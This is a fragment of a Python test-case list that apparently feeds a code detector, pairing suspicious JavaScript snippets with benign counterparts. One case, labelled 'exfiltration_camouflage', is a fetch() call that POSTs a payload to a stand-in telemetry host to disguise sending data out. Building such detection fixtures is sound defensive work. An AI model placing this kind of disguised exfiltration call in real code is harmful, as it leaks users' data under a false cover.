...
_JS_SIMPLE_CASES = [
    ...
    ('dl_frameworks', "import * as tf from '@tensorflow/tfjs';", "import { RandomForestClassifier } from 'ml-random-forest';"),
    ('exfiltration_camouflage', "fetch('https://telemetry.example.com/collect', { method: 'POST', body: JSON.stringify(payload) })", "fetch('https://api.example.com/users', { method: 'POST', body: JSON.stringify(payload) })"),
